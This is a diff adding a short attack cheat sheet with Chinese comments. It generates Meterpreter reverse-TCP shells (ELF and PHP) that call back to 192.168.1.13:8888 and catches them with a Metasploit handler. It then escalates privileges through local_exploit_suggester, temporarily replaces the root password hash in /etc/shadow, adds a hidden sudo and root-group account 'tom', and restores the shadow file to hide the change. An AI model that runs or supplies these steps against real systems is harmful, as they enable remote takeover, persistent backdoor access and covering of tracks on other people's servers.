@@ -1,0 +1,45 @@
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.13 LPORT=8888 -f elf -o shell
+#将shell上传到目标服务器
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+show options
+set lhost 192.168.1.13
+set lport 8888
+show options
+run/exploit
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.13 LPORT=8888 -f raw -o shell.php
+#将shell上传到目标服务器
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+show options
+set lhost 192.168.1.13
+set lport 8888
+show options
+run/exploit
+
+反弹连接成功,在meterpreter中输入:run post/multi/recon/local_exploit_suggester
+输入bg收起meterpreter在后台运行,(sessions -i 1 重新进入meterpreter会话)
+use exp攻击模块名称
+set lhost 192.168.1.13
+set lport 8081
+set session 1
+run/exploit
+攻击成功自动创建新的session会话
+
+linux提权成功修改root密码,添加用户,还原root密码
+备份文件:cp /etc/shadow /tmp/shadow.bak
+kali插件生成root密码:mkpasswd -m sha-512 123456
+修改密码:edit /etc/shadow (修改root第一个冒号之后 双冒号之前)
+用Xshell连接服务器
+	添加管理员组账号:adduser tom
+	设置用户密码:passwd tom
+	将sudoers文件的权限修改成可编辑:chmod -v u+w /etc/sudoers
+	使用vim编辑sudoers文件:vim /etc/sudoers
+	找到   	     root    ALL=(ALL)       ALL
+	下方添加一行  tom     ALL=(ALL)      ALL
+	将sudoers文件的权限修改成不可编辑:chmod -v u-w /etc/sudoers
+	把tom添加到root组:usermod -aG root tom
+还原文件:cp /tmp/shadow.bak /etc/shadow
